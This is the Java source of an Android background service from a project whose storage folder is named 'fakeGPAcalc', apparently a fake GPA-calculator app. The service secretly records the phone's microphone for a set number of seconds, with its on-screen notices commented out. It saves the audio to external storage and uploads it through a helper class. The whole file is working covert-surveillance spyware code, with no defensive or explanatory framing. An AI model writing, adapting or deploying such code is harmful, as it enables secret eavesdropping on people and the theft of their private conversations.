package com.coding4fun.services;

import android.app.IntentService;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;

import com.coding4fun.utils.UploadFile;

import java.io.File;
import java.io.IOException;
import java.text.Format;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

/**
 * Created by coding4fun on 09-Sep-16.
 */

public class RecordAudio extends IntentService {

    Handler handler;
    MediaRecorder mr;

    public RecordAudio() {
        super("RecordAudio");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler();
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        try {
            //showToast("Service started...");
            Log.e("RecordAudio","Service started...");
            //Toast.makeText(this, "starting recording", Toast.LENGTH_SHORT).show();
            String path = startRecording();
            //creating a directory to put out stuff in it
            File ourDir = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + "fakeGPAcalc");
            if (!ourDir.exists()) {
                ourDir.mkdir();
            }
            /*//creating our output file
            File output = new File(ourDir.getAbsolutePath() + File.separator + "S " + getCurrentDateAndTime());
            if (!output.exists()) {
                output.createNewFile();
            }*/
            //showToast("Service is over...");
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    //showToast("10 secs");
                    Log.e("RecordAudio","10 seconds");
                }
            },10000);
            int time = intent.getExtras().getInt("time",10);
            Thread.sleep(time * 1000); //sleep for 15 sec.. meanwhile, check if this service exists in running services
            stopRecording();
            if (UploadFile.uploadFile(this,path))
                Log.e("upload","success");
            else
                Log.e("upload","failed");
        } catch(Exception ex){
            Log.e("Record Exception",ex.getMessage());
        }
    }

    @Override
    public void onDestroy() {
        Log.e("RecordAudio","Service is over...");
        super.onDestroy();
    }

    String startRecording(){
        mr = new MediaRecorder();
        mr.setAudioSource(MediaRecorder.AudioSource.MIC);
        mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        String path = Environment.getExternalStorageDirectory().getAbsolutePath()+File.separator+"fakeGPAcalc"+File.separator+"A "+getCurrentDateAndTime()+".m4a";
        mr.setOutputFile(path);
        mr.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
        try {
            mr.prepare();
        } catch (IOException e) {}
        mr.start();
        Log.e("RecordAudio","Recording started...");
        return path;
    }

    void stopRecording(){
        if (mr != null){
            mr.stop();
            Log.e("RecordAudio","Recording stopped...");
            mr.release();
            mr = null;
        }
    }

    void showToast(String msg){
        final String m = msg;
        handler.post(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(RecordAudio.this, m, Toast.LENGTH_LONG).show();
            }
        });
    }

    String getCurrentDateAndTime(){
        Date today = Calendar.getInstance().getTime();
        //Format formatter = new SimpleDateFormat("MM-dd HH:mm:ss");
        Format formatter = new SimpleDateFormat("MM-dd HH.mm");
        String currentDateAndTime = formatter.format(today);
        Log.e("currentDateAndTime",currentDateAndTime);
        return currentDateAndTime;
    }

}